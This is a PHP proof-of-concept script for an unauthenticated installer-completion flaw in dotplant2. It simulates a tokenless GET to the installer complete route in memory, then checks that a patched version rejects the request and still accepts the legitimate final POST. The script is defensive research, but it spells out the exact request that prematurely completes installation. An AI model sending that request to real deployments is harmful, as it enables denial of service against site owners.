<?php
require __DIR__ . '/vulnerable_app/installer_complete_sim.php';

function out(string $message): void { echo $message . PHP_EOL; }
function pretty(mixed $value): string { return json_encode($value, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES) ?: 'null'; }
function assert_true(bool $condition, string $message): void { if (!$condition) { fwrite(STDERR, "[FAIL] {$message}\n"); exit(1); } }

out('[*] PoC context:');
out(pretty([
    'project' => 'DevGroup-ru/dotplant2',
    'poc_name' => 'dotplant2_installer_complete_missing_installer_step_guard',
    'finding' => 'CAND-0e17ef3ac330',
    'vulnerability' => 'Unauthenticated installer complete state change / pre-install DoS',
    'root_cause' => [
        'application/config/installer.php disables CSRF validation',
        'InstallerController::actionComplete() writes @app/installed.mark without method, token, or installer step guard',
    ],
    'safety' => 'Local-only simulation; it writes only to in-memory state, not the host filesystem.',
]));

$state = new InstallerState();
$vulnerable = new VulnerableInstallerApp($state);

out("\n[*] Initial state:");
out(pretty(installer_snapshot($state)));

out("\n[*] Attack: unauthenticated GET to installer complete without CSRF token or validated final-step session.");
$attack = new RequestSim(
    method: 'GET',
    route: '/installer.php?r=installer/installer/complete',
    csrfToken: null,
    installerFinalStepValidated: false
);
$response = $vulnerable->dispatch($attack);
out('[*] Vulnerable response:');
out(pretty($response->toArray()));
out('[*] State after vulnerable request:');
out(pretty(installer_snapshot($state)));

assert_true($response->status === 200, 'Vulnerable installer complete should return HTTP 200.');
assert_true(($state->files['@app/installed.mark'] ?? null) === '1', 'Vulnerable GET should write installed.mark=1.');
assert_true($state->csrfChecks === 0, 'Installer vulnerable path should perform no CSRF validation.');
assert_true(($state->auditLog[0]['auth'] ?? null) === 'none', 'Vulnerable write should happen without authentication/step guard.');
out('[PASS] Vulnerability reproduced: tokenless unauthenticated GET prematurely completed installation.');

$state->reset();
$patched = new PatchedInstallerApp($state);
out("\n[*] Control 1: same GET against patched path.");
$patchedGet = $patched->dispatch($attack);
out('[*] Patched GET response:');
out(pretty($patchedGet->toArray()));
out('[*] State after patched GET:');
out(pretty(installer_snapshot($state)));
assert_true($patchedGet->status === 405, 'Patched installer should reject GET.');
assert_true(($state->files['@app/installed.mark'] ?? null) === '0', 'Patched GET should not write installed.mark.');
out('[PASS] Patched control passed: GET complete is blocked.');

$state->reset();
$patched = new PatchedInstallerApp($state);
out("\n[*] Control 2: POST with valid CSRF but missing validated final-step session.");
$badStep = new RequestSim(
    method: 'POST',
    route: '/installer.php?r=installer/installer/complete',
    csrfToken: 'valid-yii-csrf-token',
    installerFinalStepValidated: false
);
$badStepResponse = $patched->dispatch($badStep);
out('[*] Patched bad-step response:');
out(pretty($badStepResponse->toArray()));
assert_true($badStepResponse->status === 403, 'Patched installer should require validated final-step session.');
assert_true(($state->files['@app/installed.mark'] ?? null) === '0', 'Bad-step POST should not write installed.mark.');
out('[PASS] Patched control passed: final-step/session guard is required.');

$state->reset();
$patched = new PatchedInstallerApp($state);
out("\n[*] Positive control: legitimate final POST with valid CSRF token and validated final-step session.");
$legit = new RequestSim(
    method: 'POST',
    route: '/installer.php?r=installer/installer/complete',
    csrfToken: 'valid-yii-csrf-token',
    installerFinalStepValidated: true
);
$legitResponse = $patched->dispatch($legit);
out('[*] Patched legitimate response:');
out(pretty($legitResponse->toArray()));
out('[*] State after legitimate POST:');
out(pretty(installer_snapshot($state)));
assert_true($legitResponse->status === 200, 'Legitimate patched POST should be accepted.');
assert_true(($state->files['@app/installed.mark'] ?? null) === '1', 'Legitimate patched POST should write installed.mark.');
assert_true($state->csrfChecks === 1 && $state->csrfFailures === 0, 'Legitimate patched POST should pass CSRF validation.');
out('[PASS] Positive control passed: intended installer completion still works after method/token/step guard.');

out("\nVULNERABLE: dotplant2_installer_complete_missing_installer_step_guard reproduced successfully.");
